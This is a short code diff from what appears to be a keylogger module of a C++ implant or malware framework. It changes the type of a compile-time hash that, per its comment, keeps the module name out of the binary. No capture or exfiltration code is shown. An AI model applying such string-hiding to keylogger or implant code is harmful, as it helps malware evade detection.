@@ -14,7 +14,7 @@ using namespace std;
 
 // Compute hash of moduleName at compile time, so the moduleName string don't show in the binary
 constexpr std::string_view moduleName = "keyLogger";
-constexpr unsigned long moduleHash = djb2(moduleName);
+constexpr unsigned long long moduleHash = djb2(moduleName);
 
 #ifdef _WIN32
 
